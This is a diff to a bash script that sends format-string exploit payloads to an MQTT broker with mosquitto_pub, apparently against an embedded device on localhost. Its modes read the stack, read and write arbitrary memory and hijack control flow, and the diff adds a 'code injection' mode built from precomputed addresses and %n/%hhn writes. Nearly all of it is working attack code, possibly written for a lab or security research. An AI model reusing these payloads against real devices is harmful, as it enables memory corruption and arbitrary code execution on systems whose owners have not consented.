@@ -8,12 +8,14 @@ command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"
 tag_addr="e82f403f"
 write_addr="5098fc3f5198fc3f5298fc3f5398fc3f"
 ret_addr="507efc3f517efc3f527efc3f"
+hijack_addr="04010840080108400c010840"
 
 nl_bin=$(echo "0a0d" | xxd -p -r)
 
 tag_addr_bin=$(echo $tag_addr | xxd -p -r)
 write_addr_bin=$(echo $write_addr | xxd -p -r)
 ret_addr_bin=$(echo $ret_addr | xxd -p -r)
+hijack_addr_bin=$(echo $hijack_addr | xxd -p -r)
 
 if [[ $1 == "readstack" ]]; then
     # Reading the stack
@@ -23,7 +25,7 @@ if [[ $1 == "readstack" ]]; then
         Stack frame: %x %x %x %x %x"
 elif [[ $1 == "readmem" ]]; then
     # Reading arbitrary memory
-    $command_prefix "READING ARIBTRARY MEMORY:"
+    $command_prefix "READING ARBITRARY MEMORY:"
     $command_prefix "$tag_addr_bin %6\$s"
 elif [[ $1 = "writemem" ]]; then
     # Writing arbitrary memory
@@ -31,6 +33,18 @@ elif [[ $1 = "writemem" ]]; then
     $command_prefix "$write_addr_bin%49x%6\$hhn %7\$hhn %8\$hhn %9\$n $nl_bin %6\$s"
 elif [[ $1 == "hijack" ]]; then
     # Control flow hijack to address 0x4008e37c = abort()
-    $command_prefix "CONTROL FLOW HIJACK"
+    $command_prefix "CONTROL FLOW HIJACK:"
     $command_prefix "$ret_addr_bin%112x%6\$hhn%103x%7\$hhn%37x%8\$hhn"
+elif [[ $1 == "inject" ]]; then
+    # Code injection
+    $command_prefix "CODE INJECTION:"
+    $command_prefix "$hijack_addr_bin$ret_addr_bin\
+%233x%10\$hhn\
+%259x%9\$hhn\
+%260x%11\$hhn\
+%60693x%8\$n\
+%809471x%7\$n\
+%41216x%6\$n"
+else
+    echo "I don't know that command"
 fi
